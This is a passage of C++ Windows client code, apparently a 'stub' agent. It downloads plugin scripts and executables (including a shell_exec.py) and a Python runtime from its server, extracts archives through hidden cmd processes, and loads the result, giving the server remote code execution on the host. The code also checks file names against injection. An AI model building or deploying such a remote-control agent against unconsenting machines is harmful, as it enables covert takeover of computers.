            int pct = (int)((long long)totalRead * 100 / contentLength);
            if (pct % 10 == 0) {
                LOG_I("Download", ("进度: " + std::to_string(pct) + "%").c_str());
            }
        }
    }

    CloseHandle(hFile);
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);

    LOG_I("Download", ("下载完成: " + savePathUtf8 + " (" + std::to_string(totalRead) + " bytes)").c_str());
    return true;
}

void StubCore::handleDeployFile(const std::string& params) {
    std::string fileName, targetDir;
    auto fn = params.find("\"file_name\"");
    if (fn != std::string::npos) {
        auto c = params.find(':', fn);
        auto q1 = params.find('"', c + 1);
        auto q2 = params.find('"', q1 + 1);
        if (q1 != std::string::npos && q2 != std::string::npos)
            fileName = params.substr(q1 + 1, q2 - q1 - 1);
    }
    auto td = params.find("\"target_dir\"");
    if (td != std::string::npos) {
        auto c = params.find(':', td);
        auto q1 = params.find('"', c + 1);
        auto q2 = params.find('"', q1 + 1);
        if (q1 != std::string::npos && q2 != std::string::npos)
            targetDir = params.substr(q1 + 1, q2 - q1 - 1);
    }
    for (size_t i = 0; i < fileName.size(); ) {
        if (fileName[i] == '\\' && i + 1 < fileName.size() && fileName[i + 1] == '\\')
            fileName.erase(i, 1); else i++;
    }
    for (size_t i = 0; i < targetDir.size(); ) {
        if (targetDir[i] == '\\' && i + 1 < targetDir.size() && targetDir[i + 1] == '\\')
            targetDir.erase(i, 1); else i++;
    }
    if (fileName.empty()) { LOG_E("Deploy", "empty filename"); return; }
    // 安全校验：拒绝携带引号/命令分隔符/路径穿越的文件名（防 cmd 注入与 Zip Slip）
    if (!IsValidRemoteName(fileName)) {
        LOG_E("Deploy", ("非法文件名，拒绝部署: " + fileName).c_str());
        return;
    }
    if (!targetDir.empty() && !IsValidRemoteName(targetDir)) {
        LOG_E("Deploy", ("非法目标目录，拒绝部署: " + targetDir).c_str());
        return;
    }
    if (targetDir.empty()) {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep); ws = ws.substr(0, ws.find_last_of(L'\\'));
        targetDir = std::string(ws.begin(), ws.end()) + "\\plugins";
    }
    LOG_I("Deploy", ("deploy: " + fileName + " -> " + targetDir).c_str());
    // create nested dirs
    for (size_t p = 0; p < targetDir.size(); p++) {
        if (targetDir[p] == '\\' || targetDir[p] == '/') {
            std::string sub = targetDir.substr(0, p);
            if (!sub.empty()) CreateDirectoryA(sub.c_str(), nullptr);
        }
    }
    CreateDirectoryA(targetDir.c_str(), nullptr);
    std::string url = _serverUrl + "/api/files/get?name=" + fileName;
    std::wstring save = std::wstring(targetDir.begin(), targetDir.end()) + L"\\" + std::wstring(fileName.begin(), fileName.end());
    if (!httpDownload(url, save)) { LOG_E("Deploy", "download failed"); return; }
    LOG_I("Deploy", "download ok");
    if (fileName.size() > 4 && fileName.substr(fileName.size() - 4) == ".zip") {
        LOG_I("Deploy", "extracting zip...");
        std::string unzipDir = targetDir + "\\" + fileName.substr(0, fileName.size() - 4);
        CreateDirectoryA(unzipDir.c_str(), nullptr);
        std::wstring cmd = L"cmd /c tar -xf \""
            + std::wstring(save.begin(), save.end())
            + L"\" -C \"" + std::wstring(unzipDir.begin(), unzipDir.end()) + L"\"";
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        if (CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                          nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 120000);
            DWORD exitCode = 0;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            LOG_I("Deploy", ("extracted: " + unzipDir + " exit=" + std::to_string(exitCode)).c_str());
        } else { LOG_E("Deploy", "extract failed"); }
    }
    _plugins.scanPlugins(std::wstring(targetDir.begin(), targetDir.end()));
    LOG_I("Deploy", "rescan done");
}

// ═══════════════════════════════════════════════
// 插件同步：从服务端拉取缺失的插件
// ═══════════════════════════════════════════════

void StubCore::syncPlugins(const std::wstring& pluginDir) {
    LOG_I("Sync", "=== syncPlugins start ===");

    // 确保 plugins 目录存在
    CreateDirectoryW(pluginDir.c_str(), nullptr);

    // ═══ 0) 检查并下载嵌入式 Python 运行时 ═══
    // 获取 exe 所在目录
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring appDir = std::wstring(exePath);
    appDir = appDir.substr(0, appDir.find_last_of(L'\\'));
    std::wstring runtimeDir = appDir + L"\\runtime";
    std::wstring pythonExe = runtimeDir + L"\\python.exe";

    if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
        LOG_I("Sync", "Python runtime not found, downloading from server...");
        CreateDirectoryW(runtimeDir.c_str(), nullptr);

        // 从服务端下载 python 嵌入式包
        std::string rtResp = httpGet("/api/runtime");
        LOG_I("Sync", ("Runtime list: " + rtResp.substr(0, 200)).c_str());

        // 找 python*.zip
        std::string pyZip;
        auto pp = rtResp.find("python");
        if (pp != std::string::npos) {
            auto q1 = rtResp.rfind('"', pp);
            auto q2 = rtResp.find('"', pp);
            // 简单提取文件名
            while (pp < rtResp.size() && rtResp[pp] != '"') pp++;
            pyZip = rtResp.substr(q1 + 1, pp - q1 - 1);
        }

        if (pyZip.empty()) {
            LOG_E("Sync", "  no python runtime found on server");
        } else if (!IsValidRemoteName(pyZip) || pyZip.find('/') != std::string::npos || pyZip.find('\\') != std::string::npos) {
            LOG_E("Sync", ("  非法运行时包名，拒绝下载: " + pyZip).c_str());
        } else {
            LOG_I("Sync", ("Downloading Python runtime: " + pyZip).c_str());
            // httpDownload 需要完整 URL（InternetCrackUrlA 不支持相对路径）
            std::string zipUrl = _serverUrl + "/api/runtime/get?name=" + pyZip;
            std::wstring zipPath = appDir + L"\\" + std::wstring(pyZip.begin(), pyZip.end());
            if (httpDownload(zipUrl, zipPath)) {
                LOG_I("Sync", "  zip downloaded, extracting...");

                // 解压到 runtime 目录
                std::wstring unzipCmd = L"cmd /c tar -xf \""
                    + zipPath + L"\" -C \"" + runtimeDir + L"\"";
                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi = {};
                if (CreateProcessW(nullptr, (LPWSTR)unzipCmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                                  nullptr, nullptr, &si, &pi)) {
                    WaitForSingleObject(pi.hProcess, 120000);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    LOG_I("Sync", "  Python runtime extracted");
                }
                // 删除 zip
                DeleteFileW(zipPath.c_str());
            } else {
                LOG_E("Sync", "  Python runtime download FAILED");
            }
        }

        // 验证
        if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LOG_E("Sync", "Python runtime install FAILED - plugins will not work");
        } else {
            LOG_I("Sync", "Python runtime ready");
        }
    } else {
        LOG_I("Sync", "Python runtime already installed");
    }

    // ═══ 1) 从服务端获取可用插件列表 ═══
    std::string resp = httpGet("/api/plugins");
    if (resp.empty()) {
        LOG_W("Sync", "Failed to get plugin list from server");
        return;
    }
    LOG_I("Sync", ("Server plugins: " + resp.substr(0, 200)).c_str());

    // 2) 简易 JSON 解析：遍历每个 {...} 块
    //    格式: [{"id":"xxx","name":"xxx","version":"xxx"},...]
    size_t pos = 0;
    int downloaded = 0;
    while ((pos = resp.find("\"id\"", pos)) != std::string::npos) {
        // 提取 id
        auto c1 = resp.find(':', pos);
        auto q1 = resp.find('"', c1 + 1);
        auto q2 = resp.find('"', q1 + 1);
        if (q1 == std::string::npos || q2 == std::string::npos) break;
        std::string pluginId = resp.substr(q1 + 1, q2 - q1 - 1);
        pos = q2 + 1;

        if (pluginId.empty()) continue;

        // 服务端返回的插件 ID 只允许简单文件名（不允许路径分隔）
        if (!IsValidRemoteName(pluginId) || pluginId.find('/') != std::string::npos || pluginId.find('\\') != std::string::npos) {
            LOG_W("Sync", ("非法插件 ID，跳过: " + pluginId).c_str());
            continue;
        }

        // 检查本地是否已有此插件
        std::wstring localDir = pluginDir + L"\\" + std::wstring(pluginId.begin(), pluginId.end());
        std::wstring localPjson = localDir + L"\\plugin.json";
        if (GetFileAttributesW(localPjson.c_str()) != INVALID_FILE_ATTRIBUTES) {
            LOG_I("Sync", ("Plugin exists locally: " + pluginId).c_str());
            continue;
        }

        // 3) 本地缺失，从服务端下载整个插件目录
        LOG_I("Sync", ("Downloading plugin: " + pluginId).c_str());
        CreateDirectoryW(localDir.c_str(), nullptr);

        // 下载 plugin.json
        std::string pjsonUrl = "/api/plugins/get?name=" + pluginId + "/plugin.json";
        std::string pjsonBody = httpGet(pjsonUrl);
        if (!pjsonBody.empty()) {
            // 写入本地文件
            std::wstring pjsonPath = localDir + L"\\plugin.json";
            HANDLE hFile = CreateFileW(pjsonPath.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written = 0;
                WriteFile(hFile, pjsonBody.c_str(), (DWORD)pjsonBody.size(), &written, nullptr);
                CloseHandle(hFile);
                LOG_I("Sync", ("  saved plugin.json: " + pluginId).c_str());
            }
        }

        // 从 plugin.json 里找 command 字段，解析需要下载哪些文件
        // command 格式如 "python shell_exec.py" → 需要下载 shell_exec.py
        auto cmdPos = pjsonBody.find("\"command\"");
        if (cmdPos != std::string::npos) {
            auto cc = pjsonBody.find(':', cmdPos);
            auto cq1 = pjsonBody.find('"', cc + 1);
            auto cq2 = pjsonBody.find('"', cq1 + 1);
            if (cq1 != std::string::npos && cq2 != std::string::npos) {
                std::string command = pjsonBody.substr(cq1 + 1, cq2 - cq1 - 1);
                // 解析命令中的文件名
                std::vector<std::string> filesToDownload;
                // "python shell_exec.py" → 提取 shell_exec.py
                // "python3 file_manager.py" → 提取 file_manager.py
                size_t sp = 0;
                while (sp < command.size()) {
                    while (sp < command.size() && command[sp] == ' ') sp++;
                    auto end = command.find(' ', sp);
                    if (end == std::string::npos) end = command.size();
                    std::string token = command.substr(sp, end - sp);
                    // 只下载 .py 或 .js 或 .exe 文件
                    if (token.size() > 3) {
                        std::string ext = token.substr(token.size() - 3);
                        if (ext == ".py" || ext == ".js" || ext == ".exe" || ext == ".sh") {
                            filesToDownload.push_back(token);
                        }
                    }
                    sp = end + 1;
                }

                // 下载每个文件
                for (const auto& fname : filesToDownload) {
                    // 校验插件文件名（防路径穿越写文件）
                    if (!IsValidRemoteName(fname) || fname.find('/') != std::string::npos || fname.find('\\') != std::string::npos) {
                        LOG_E("Sync", ("  非法文件名，拒绝下载: " + fname).c_str());
                        continue;
                    }
                    std::string fileUrl = "/api/plugins/get?name=" + pluginId + "/" + fname;
                    std::string fileBody = httpGet(fileUrl);
                    if (!fileBody.empty()) {
                        std::wstring filePath = localDir + L"\\" + std::wstring(fname.begin(), fname.end());
                        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD written = 0;
                            WriteFile(hFile, fileBody.c_str(), (DWORD)fileBody.size(), &written, nullptr);
                            CloseHandle(hFile);
                            LOG_I("Sync", ("  saved: " + fname).c_str());
                        }
                    } else {
                        LOG_E("Sync", ("  download failed: " + fname).c_str());
                    }
                }
            }
        }

        downloaded++;
        LOG_I("Sync", ("Downloaded plugin: " + pluginId).c_str());
    }

    LOG_I("Sync", ("=== syncPlugins done, downloaded " + std::to_string(downloaded) + " plugins ===").c_str());
}
